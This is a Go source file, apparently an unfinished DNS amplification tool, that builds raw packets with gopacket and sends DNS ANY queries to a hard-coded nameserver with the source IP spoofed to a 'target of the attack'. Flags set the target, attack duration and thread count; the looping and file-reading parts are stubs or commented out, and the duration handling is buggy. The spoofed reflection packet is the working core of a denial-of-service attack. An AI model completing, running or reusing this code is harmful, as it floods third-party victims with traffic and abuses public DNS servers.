package main

import (
	"flag"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// CLI arguments
var target_mac = flag.String("target_mac", "", "The MAC address of the first hop, probably gateway")
var target_ip = flag.String("target_ip", "", "The IP address of the target of the attack")
var filename = flag.String("filename", "domains.csv", "A csv file with domain names")
var num_threads = flag.Int("num_threads", 1, "The number of threads to run in parallel")
var duration = flag.Int("duration", 1, "The duration of the attack in seconds")

var src_mac net.HardwareAddr
var dst_mac net.HardwareAddr
var target net.IP
var options gopacket.SerializeOptions

const SRC_PORT = 42000
const IFACE = "enp0s31f6"

func init() {
    options = gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
    }
}

func main() {
    flag.Parse()
    ifaces, err := net.Interfaces()
    if err != nil {
        panic(err)
    }
    for _, iface := range ifaces {
        if iface.Name == IFACE {
            src_mac = iface.HardwareAddr
        }
    }
    target = net.ParseIP(*target_ip)
    dst_mac, err = net.ParseMAC(*target_mac)
    if err != nil {
        panic(err)
    }

    // readFile()

    // Start threads
    // for i:=0; i<num_threads; i++ {
    //     go send()
    // }
    // Wait for duration in seconds, then stop attack
    send()
    time.Sleep(time.Duration(*duration))
}

// Read the file into a datastructure
func readFile() {

}

// Goroutine to send packets, each thread has own number and it uses that number as modulo for which line to read
// Proceed in round-robin fashion (cycling through domains / name servers)
func send() {
    handle, err := pcap.OpenLive(IFACE, 1500, false, pcap.BlockForever)
    if err != nil {
        panic(err)
    }
    // Keep sending packets, TODO: put this in loop after it works
    dst_ip := net.ParseIP("84.116.46.21")               // IP of the nameserver
    packet := makePacket("google.com", dst_ip)      // Domain name to query
    err = handle.WritePacketData(packet)
    if err != nil {
        panic(err)
    }
}

// create ANY request packet
func makePacket(domainName string, destinationIP net.IP) []byte {
    ethernet := layers.Ethernet{
        SrcMAC: src_mac,
        DstMAC: dst_mac,
        EthernetType: layers.EthernetTypeIPv4,
    }
    ip := layers.IPv4{
        Version: 4,
        TTL: 64,
        Protocol: layers.IPProtocolUDP,
        SrcIP: target,              // Target IP (spoofed)
        DstIP: destinationIP,       // Nameserver IP
    }
    udp := layers.UDP{
        SrcPort: SRC_PORT,
        DstPort: 53,
    }
    udp.SetNetworkLayerForChecksum(&ip)
    qst := layers.DNSQuestion{
        Name: []byte(domainName),       // Domain name to request
        Class: layers.DNSClassIN,
        Type: layers.DNSType(layers.DNSClassAny),
    }
    dns := layers.DNS{
        RD: true,
        ID: 21020,          // Random ID
        TC: false,
        OpCode: 0,
        Questions: []layers.DNSQuestion{qst},
    }
    buffer := gopacket.NewSerializeBuffer()
    if err := gopacket.SerializeLayers(buffer, options,
        &ethernet,
        &ip,
        &udp,
        &dns,
    ); err != nil {
        panic(err)
    }
    return buffer.Bytes()
}

